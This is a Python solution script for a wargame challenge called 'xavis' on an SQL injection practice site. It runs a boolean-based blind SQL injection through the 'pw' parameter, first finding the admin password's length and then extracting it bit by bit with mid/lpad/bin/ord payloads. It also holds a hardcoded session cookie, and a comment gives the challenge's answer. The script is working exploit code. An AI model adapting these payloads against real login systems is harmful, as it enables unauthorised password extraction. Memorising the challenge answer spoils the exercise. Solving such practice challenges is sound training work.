import requests

def get(payload):
    return requests.get(
        'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php',
        params={'pw': payload},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get length
length = 1
while True:
    print("Try length", length)
    if "<h2>Hello admin</h2>" in get(f"'||id = 'admin'&&length(pw) = {length} -- -"):
        break
    length += 1
print("Length is", length)

char_length = 24

# get password
password = ''
for index in range(1, length // 4 + 1):
    tmp = ''
    for bit in range(1, char_length + 1):
        if "<h2>Hello admin</h2>" in get(f"'||id = 'admin'&&mid(lpad(bin(ord(mid(pw,{index},1))),24,0),{bit},1) -- -"):
           tmp += '1'
        else:
            tmp += '0'

    password += chr(int(tmp, 2))
    print(password)

# password is 우왕굳

# certify
print(get(password))